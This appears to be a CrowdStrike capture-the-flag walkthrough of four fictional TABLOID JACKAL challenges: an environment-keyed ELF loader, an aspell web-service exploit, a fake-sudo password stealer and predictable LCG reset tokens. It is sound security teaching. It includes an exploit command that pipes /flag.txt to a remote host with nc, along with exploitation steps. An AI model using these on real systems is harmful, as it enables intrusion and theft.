# Adversary Quest 2022: 4 Tabloid Jackal Challenges | CrowdStrike

- **Source :** crowdstrike
- **URL :** https://www.crowdstrike.com/en-us/blog/tabloid-jackal-adversary-quest-walkthrough-2022/
- **Date :** August 09, 2022

---

# Adversary Quest 2022 Walkthrough, Part 2: Four TABLOID JACKAL Challenges

August 09, 2022

• [ Max Julian Hofmann - Lukas Kupczyk - Karsten Koenig](/en-us/blog/author.max-julian-hofmann---lukas-kupczyk---karsten-koenig/ "Posts by Max Julian Hofmann - Lukas Kupczyk - Karsten Koenig") • [Threat Hunting & Intel](/en-us/blog/category.counter-adversary-operations/ "Threat Hunting & Intel")


In July 2022, the CrowdStrike Intelligence Advanced Research Team hosted the second edition of our Adversary Quest. As in the previous year, this “capture the flag” event featured 12 information security challenges in three different tracks: eCrime, Hacktivism and Targeted Intrusion. In each track, four consecutive challenges awaited the players, requiring different skills, including reverse engineering, vulnerability analysis and exploitation, and cryptanalysis.

Part 1 of this blog series described our intended approach to [solving the challenges of the eCrime track](/en-us/blog/catapult-spider-adversary-quest-walkthrough-2022/). In this Part 2 blog post, we describe our intended approach to solving the challenges of the Hacktivism track. In this track the players were asked to analyze activities by TABLOID JACKAL. The objective of this actor was described as follows:

_The activities of SPACE JACKAL last year have not gone unnoticed, and one of their nemesis has decided to respond. Now, researchers are tracking a new activity cluster, which is very likely to belong to a group called TABLOID JACKAL. This actor is known to spread fake news with the intention of convincing people to use TABs rather than spaces as indentation characters. We were approached by “Daily Code”, a newspaper agency that is known for reports on algorithms, software architecture and coding styles, to analyze recent activities of TABLOID JACKAL on their network._

## **Challenge #1: “display0”**

_We were approached by our customer "Daily Code" who detected suspicious activity on a VPN gateway. One of their sysadmins did some basic inspection of the system and was able to discover an unknown ELF binary._

_For further analysis, the sysadmin sent us the ELF alongside an asciinema recording of their terminal session._

For this challenge, we were given two different files:

  * `display0`: An x64 ELF binary
  * `challenge.cast`: An asciicast recording file



As outlined in the description, the asciicast recording was created by a sysadmin, who discovered a suspicious ELF binary on a system. It contains a log of the admin’s shell interactions during the investigation.

The recording can be replayed by using the `asciinema` shell client as follows:

`$ asciinema play challenge.cast`

The following listing shows an excerpt of the recording:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-57.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-57.png)(Click to enlarge)

As we can see, the admin first executed a number of commands to gather general information about the system, such as the running processes, configured network interfaces and more. At the end of the session, a hidden file named `.display0` is discovered in the directory `/tmp/.Xorg`. The sha256 command seen in the end of the session allows us to confirm that the binary we were given alongside the recording is identical.

Using `strace`, we can get a first overview of what the binary actually does when executed: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-58.png) As can be seen in the output, one of the first actions is to mmap the public part of the ssh host keys as readable. Afterwards, the binary uses an `AF_NETLINK` socket to retrieve information about the system’s network interfaces (output shortened):

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-59.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-59.png)(Click to enlarge)

Next, the content of the files

  * `/proc/cpuinfo`
  * `/proc/meminfo`
  * `/etc/fstab`



Are read (or mmap’ed) and finally the `uname` syscall is executed: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-60.png) At the end a memory file descriptor is created via `memfd_create` and 510168 bytes are written to it. That file descriptor is then passed to execve by using the corresponding path in the `/proc` file system:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-61.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-61.png)(Click to enlarge)

The combination of memfd_create and execve is a fairly [well-known technique](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html) in Linux to execute an in-memory ELF. However, executing the binary locally does not appear to succeed on our analysis machine. The call to `execve` returns with an `Exec format error`, indicating that an invalid executable was given.

The fact that a number of system properties were gathered before the execve call leads to the assumption that there is some kind of dependency between these properties and the resulting binary passed to execve.

Using findcrypt-yara (or similar tools), we can quickly assess that the binary contains constants that are used for SHA256 hashing and AES encryption: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-62-300x105.png) This further strengthens the earlier assumption that the system properties could be used in some form to decode/decrypt an embedded binary: A SHA256 digest might be used to derive a key for an AES-based decryption routine. For further analysis, IDA was used to disassemble and decompile the binary.

After some reversing, it becomes clear that the gathered information is used to create a SHA256 digest, of which the first 16 bytes are used as a key for AES128 in counter mode. The following sequence gives a rough outline of the information used to derive the key:

  * SSH host keys (public, addr `0x173`)
  * Network interfaces (IPv4 / IPv6 / MAC, addr: `0x18db`)
  * `/proc/cpuinfo` (`model name` and `flags`, addr: `0x191`)
  * `/proc/meminfo` (MemTotal, addr: `0x193f`)
  * `/etc/fstab` (addr: `0x1958`)
  * hostname (addr: `0x1590`)



The SHA256 update function is located at `0x1ee0` while the AES128-CTR decryption routine can be found at `0x26d1`.

After renaming identifiers and adding type information, we get the following `main()` function: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-64.png) The following screenshot shows the function `dynamic_key_derive()`, which contains the main logic of the key derivation: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-65.png) As the environment of the local test system is different from the one where the binary has been discovered, a different key is derived, leading to a wrongly decrypted embedded binary. The following Python script can be used to derive the correct key based on the values observed on the remote system:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-66.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-66.png)(Click to enlarge)

Afterwards, the inner binary can be extracted and decrypted as follows: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-67-1024x183.png) Without further ado, we are able to extract the flag contained in the inner binary as follows:![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-68-300x52.png)

## **Challenge #2: “Spellcheck”**

_Initial response handling of the “Daily Code” incident has turned the spotlight on a web service that was apparently exploited by TABLOID JACKAL to gain initial access to a certain laptop. This web service was believed to run locally on the laptop of the managing editor of “Daily Code”, but a quick scan of the network revealed that it was exposed to the whole internal network. Please analyze the web service - reachable at 116.202.161.100:5000 for the purpose of analysis - and help us to identify the vulnerability._

A tar file was given for the second challenge of the TABLOID JACKAL track, containing a Python Flask web API that implements a wrapper around the spell checking tool aspell:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-69.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-69.png)(Click to enlarge)

The directory named `dicts` contains some English dictionaries. The following listing shows the Python code of the API: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-70.png) The code exposes the following HTTP routes that implement various functions:

  * `/spellcheck` (conducts spell checking with aspell)
  * `/status` (returns working directory and OS/version information)
  * `/dicts` (returns available dictionaries)
  * `/dicts/update` (allows to upload dictionaries, performs authentication check)



When looking closer at the `/dicts/update` route, it becomes clear that the password check is only conducted when sending an HTTP POST request. However, the route also supports HTTP GET, allowing us to skip authentication. Afterwards, the function checks whether a `dict` entry is contained in the `request.files` mapping, which Flask uses to store uploaded files. If that is the case, and a filename has been provided, the new dictionary is stored inside the application’s dictionary folder. This should allow us to upload arbitrary files to the server. However, a directory traversal attack is not possible due to the use of Flask’s `secure_filename()` function.

Looking at the `/spellcheck` route, we can see that it passes a language specified as the HTTP parameter `lang` to aspell as a command line argument. Additionally, the data specified as the HTTP parameter `text` is sent to aspell’s stdin.

As a next step, `aspell pipe` was invoked locally in order to explore its functionality. In the most basic case, we can provide a word to its standard input, and aspell replies with a list of suggestions, as shown for `helo` in the following listing:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-71.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-71.png)(Click to enlarge)

However, browsing the [official documentation](http://aspell.net/man-html/Through-A-Pipe.html) shows that aspell behaves differently in case values are provided that start with special characters.

The following list taken from the documentation gives an overview:
    
    
    *word	Add a word to the personal dictionary
    &word	Insert the all-lowercase version of the word in the personal dictionary
    @word	Accept the word, but leave it out of the dictionary
    #	Save the current personal dictionary
    ~	Ignored for Ispell compatibility
    +	Enter TeX mode.
    +mode	Enter the mode specified by mode.
    -	Enter the default mode.
    !	Enter terse mode
    %	Exit terse mode
    ^	Spell-check the rest of the line
    

Further, the documentation mentions that the format `$$command `allows to read and modify configuration options (among other things).

Invoking `aspell dump config` gives a first overview of these options (shortened): ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-72-1024x778.png) At runtime, these values can be printed via `$$cr <name>`: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-73-1024x193.png) Similarly, values can be written by using `$$cs <name>,<value>`: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-74-1024x167.png) The ability to set configuration options opens up a large potential attack surface. For example aspell makes use of spell checking plugins (for example for TeX), which can be implemented in shared objects and might enable a route for code execution.

As seen in the earlier command overview list, the character + instructs aspell to enter TeX mode. To quickly get an overview of what happens when doing so, aspell was invoked with strace:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-75.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-75.png)(Click to enlarge)

As shown in the output, entering TeX mode made aspell load the shared object `tex-filter.so` from the directory `/usr/lib/aspell/x86_64-linux-gnu`.

Now with the ability to upload arbitrary files to the dictionary folder directly and being able to manipulate configuration values at runtime, we might be able to force aspell into loading a malicious shared object.

As noted in the documentation, aspell makes use of the configuration option `filter-path` to look for its plugins. To quickly validate this assumption, we can alter its value and try to enter TeX mode afterwards: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-76-1024x193.png) As we can see, aspell actually crashed with an unhandled error, indicating that changing `filter-path` did indeed have an effect on its plugin loading. The obvious reasoning for that might be that there are simply no matching files stored in `/tmp`. To test that assumption, the system-provided TeX filter files were copied to `/tmp`: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-77-1024x51.png) Afterwards, aspell was started with strace to confirm that the copied files are loaded from that directory: ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-78-1024x232.png) As shown in the output, the shared object is indeed loaded by aspell. Putting everything together, we should therefore be able to exploit the remote service in the same way:

  * Upload malicious `tex-filter.so` (and auxiliary files) to the dict directory
  * Derive absolute path of remote dict directory via `/status`
  * Provide input to aspell that
    * Changes `filter-path` to the dictionary directory
    * Enters TeX mode, triggering loading of the malicious shared object



The following files implement the outlined exploit. It can be used as follows to gain code execution and retrieve the flag from the remote host: `$ ./exploit.py http://116.202.161.100:5000 'cat /flag.txt | nc <lhost> 2323'`

### **Makefile**

![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-79-1024x214.png)

### **tex-filter.c**

![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-80.png)

### **exploit.py**

![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-81.png)

## **Challenge #3: “Password”**

_As your investigation revealed TABLOID JACKAL gained access to the laptop of the managing editor by exploiting their spellcheck service, but that would yield only user-privileged access. This level of privilege does not carry much risk. We did get a copy of the managing editor’s home directory for you though to find out whether the threat was fully removed._

According to the challenge description we have received a folder structure where we can find a few files:![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-82-1024x971.png)

### **Reverse-Engineering the Implant**

Loading the probably malicious binary named `boltctl` into Ghidra shows that the `main()` function (identified via the entry) is rather short and also executes a new program via `execvp()` via a path (first argument) that is initialized randomly also in main(). Right before this `execvp()` call, there is another function invoked that becomes of interest.

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-83.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-83.png)(Click to enlarge)

Using Ghidra, the decompilation of the function starting at position `0x00101a31` reveals a pattern that raises the expectation of some strings being encrypted: functions known for receiving a string as first argument (e.g., `getenv()` and `puts()`) receive not strings, but the return value of the function `FUN_00101b61()`.

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-84.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-84.png)(Click to enlarge)

This function, named `FUN_00101b61()`, is invoked with two arguments — one data element and a second that is probably the length of the first. Our initial assumption is that this is a string-decryption routine, which can be confirmed by reverse engineering it:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-85.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-85.png)(Click to enlarge)

### **String Decryption**

There are various ways to obtain the clear text strings used by the program: probably the easiest way is to reimplement the function as a Python script like the following that decrypts the given strings and makes them readable:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-86.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-86.png)(Click to enlarge)

### **Fake Sudo Behavior**

Decrypting the strings reveals that the binary prints messages best known from the program `sudo`. For example, for a certain yet unknown condition, the message “`Sorry, try again.`” is printed. Also the message “` password for %s:`" is printed as well. The routine that prints both strings and executes some other code is started if and only if the function named `FUN_00101329()` returns 1.

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-87.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-87.png)(Click to enlarge)

Reversing this function `FUN_00101329()` shows that it returns 1 if four specific environment variables are set, which is the case when `sudo` was used to invoke the program, as can be seen in the commented listing below:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-88.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-88.png)(Click to enlarge)

Overall, this makes it evident that the binary checks whether it was invoked by `sudo` (for example with the command `$ sudo boltctl`) and if so, it fakes `sudo` behavior, probably trying to trick the user into typing the password again into a non-sudo prompt.

### **Exfiltrating the User’s Password**

After presenting a fake prompt, the password is handled via another function call in `FUN_00101a31()`. The password is passed to the function starting at position `0x0010182b`. Decompiling this function using Ghidra reveals another encryption routine and a call to yet another function `FUN_00101714()` with an argument that is probably the generated ciphertext.

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-89.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-89.png)(Click to enlarge)

This decompilation shows that each character is encrypted using a round key (`local_43c`) and the XOR-operation. This round key is computed inside the loop, based on three parameters that are also updated for each iteration. The decompilation of this round key function `FUN_00101651()` is as follows: [![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-90-1024x595.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-90.png) Both decompilations are required and sufficient to write a decryption routine, later used as `decrypt_payload.py`:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-91.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-91.png)(Click to enlarge)

### **Reverse-Engineering the Exfiltration Channel**

The following decompilation of the function handling the encrypted password, called by the function `FUN_0010182b()` shown above, is generated using Ghidra:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-92.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-92.png)(Click to enlarge)

This shows that the encrypted password is sent via a network socket directly using the `sendto()` function without any modification. The port used is `1901` and the receiver address is `0xffffffff` — which is the broadcast address, also known as `255.255.255.255`. In addition, `SO_BROADCAST` is configured using `setsockopt()` and the socket is a UDP socket created with `socket()`. Therefore it is reasonable to presume that a local insider is listening on this port, waiting for an incoming encrypted password.

### **Extracting the Password from EDR Logs**

Luckily we were provided with a network capture file, recorded by a “sensor” running on the laptop, that contains the captured password. The captured packet can be extracted using `tcpdump` and then decrypted using the Python script shown above:![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-93-1024x267.png)

## **Challenge #4: “tokens”**

_After getting root, the TABLOID JACKAL explored all the accounts that exist on the laptop. They thereby found out that the editor is using a special web application (reachable at 116.202.83.208:42300) for reviewing articles in the publishing pipeline. Moreover, they observed that the editor is using the admin account for this purpose. We believe that TABLOID JACKAL_

_found a vulnerability in it that can be exploited to get access to the editor’s reviewer account._ A quick overview of the web interface shows that the application exposes two functionalities: Editorial Access and Mailbox Access. Both require user authentication. Moreover, it is possible to register new users and reset the password for editorial access. However, the Editorial page is empty if we use a new user to access it. ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-94-1024x381.png) After registering a new user and testing the password reset functionality, a reset token is sent to the user’s mailbox. ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-95-1024x794.png) Apparently, the reset token is a longer random number of at least 48 bits in length as the largest reset token observed (239660317423097) is a 48 bit number. A brute-force search of the token is therefore not viable. Additionally, experimenting with the application shows that the token is deleted after a wrong attempt as the last issued token is not working if a wrong token was given first.

Further investigation of the application shows a hint in the `robots.txt`. ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-96-300x82.png) The path `/.git` is excluded from indexing by search engines. A source code file is exposed in the path. ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-97-300x50.png) In particular, the file `random_generator.py` contains a definition for the class `Random` that implements a custom random number generator. ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-98-1024x743.png) After doing some research of types of random number generators, we learn that the class implements a Linear Congruential Generator (LCG). Basically, new random numbers are generated by calculating a simple linear equation from several hardcoded values and a seed that is restricted to 48 bits in length (due to the AND operation using` self.mask` in line 12). The return value of the internal function `_next()` is restricted to 26 bits in line 15. The `_next()` function is called three times by `next()` which constructs the resulting random number from these three 26 bit numbers by bit shifting the return values of the latter two calls and adding them. The method` next_limit()` can be used to create an upper limit for the generated random number by applying a modulo operation.

The upper limit 281474976710656 in the example calls in lines 25 to 31 is 248 and therefore limits return values to 48 bits. This and that the output are decimal numbers like the reset tokens suggest that this is the random number generator used by the web application to create password reset tokens.

LCGs are not cryptographically secure, though. The security of any random number generator depends on the property that attackers cannot guess the seed given a certain number of generated numbers. While some bits of the seed are dropped from the result in this LCG, it is indeed possible to calculate the seed given a number of outputs as they are just the result of basic linear equations that can be completely solved given enough information.

Hence, it is possible to calculate future outputs, i.e., password reset tokens, of the random number generator after the current seed is calculated.

### **Solution**

To calculate the seed from given outputs, we first have to investigate what information about the seed remains in a generated number.

Like stated above, the method `_next()` is called three times by `next()`. From these calls, the lowest 21 bits of the new seed after the first call remain in the final output. That is the case because the return values of the second and third call are shifted by 21 bits to 42 bits respectively and added to the return value of the first call. This can be seen in line 18 of the `random_generator.py` listing above.

The easiest solution therefore is to generate three random numbers using the password reset functionality, take the lowest 21 bits of the first one and search through the possible values for the remaining 27 bits via two loops. In particular, the 21 bits have to be shifted left by 22 bits as `_next()` shifts the seed right by 22 bits before returning the result. Therefore, the lower 22 bits of the seed are searched as well as the upper 5 bits as the seed is 48 bits long in total.

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-99.png)](/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-99.png)(Click to enlarge)

The seed of the class Random is set to every possible seed while fixing these lower 21 bits from the first output in line 10. After simulating the two other calls to `_next()` twice in the following lines, the internal seed of `Random` should be exactly the same as after the generation of the first random output if the correct seed was found using this search algorithm. This is verified by generating two random numbers. If these are the same as the ones generated by the password reset, we have found the correct seed and can generate the next reset tokens. This is checked in lines 14 and 19.

Now, we have to request a password reset for the `admin` account and can use the first reset token the search algorithm returned in order to set the password for `admin` to an arbitrary value. Using this password, it is possible to access the editorial page with the `admin` account.![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/08/Picture1-100-1024x964.png)

## **Final Remarks**

This concludes the CrowdStrike Intelligence Adversary Quest 2022. The TABLOID JACKAL track was about a threat actor attacking news paper agencies to spread fake news about the superiority of TAB characters for source code indentation. In the first challenge, players were asked to reverse engineer a sample that was found on a host inside the internal network of “Daily Code,” a fictional newspaper agency. This binary was used as a beachhead for attacking a service running on the laptop of the managing editor, and the second challenge was about reproducing this attack. In the third challenge players needed to analyze another binary, dropped on the laptop after exploitation, that was used to steal and exfiltrate the password of the user on the laptop. After getting access to the laptop and gaining root access there, TABLOID JACKAL also had access to a Content Management System that is used by the Daily Code to edit and publish articles. In the final challenge, players had to reproduce a vulnerability in this Content Management System that was exploited by TABLOID JACKAL to arbitrarily edit and publish articles. 

We hope you enjoyed the Adversary Quest and are now well prepared for the next one. Feel free to drop us an email at [adversaryquest@crowdstrike.com](mailto:adversaryquest@crowdstrike.com) — especially if you published a writeup, want to provide some feedback or have any questions. [Also note that CrowdStrike is constantly hiring talented cybersecurity professionals!](https://crowdstrike.wd5.myworkdayjobs.com/en-US/crowdstrikecareers?Job_Family=1408861ee6e201d67af3e0f6b000d60b)

#### Additional Resources

  * _Read[Adversary Quest 2022 Walkthrough, Part 1: Four CATAPULT SPIDER Challenges](/en-us/blog/catapult-spider-adversary-quest-walkthrough-2022/)._
  * _Learn more about the adversaries CrowdStrike tracks by exploring the[ Adversary Universe](https://adversary.crowdstrike.com)._
  * _To stay ahead of today’s adversaries, read the[ CrowdStrike 2022 Global Threat Report](/en-us/global-threat-report/)._
  * _[Get a full-featured free trial of CrowdStrike Falcon® Prevent™](https://go.crowdstrike.com/try-falcon-prevent.html) and learn how true next-gen AV performs against today’s most sophisticated threats._



[ ](https://www.linkedin.com/shareArticle) [ ](https://twitter.com/share)

* * *

#### Related Content

[ ![CrowdStrike Named a Leader in The Forrester Wave™: External Threat Intelligence Service Providers, Q3 2026](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Forrester%20Wave%20Threat%20Intel%202026-2-1060x698_Blog?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 17, 2026  CrowdStrike Named a Leader in The Forrester Wave™: External Threat Intelligence Service Providers, Q3 2026 ](/en-us/blog/crowdstrike-named-leader-forrester-wave-external-threat-intelligence-q3-2026/) [ ![PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-InfoStealer?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 15, 2026  PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting ](/en-us/blog/phantomraven-llm-generated-information-stealer-for-bug-bounty-hunting/) [ ![Peer Pressure: Inside the Sality Botnet Disruption Operation](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalCon-Sality?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 01, 2026  Peer Pressure: Inside the Sality Botnet Disruption Operation ](/en-us/blog/inside-sality-botnet-disruption-operation/)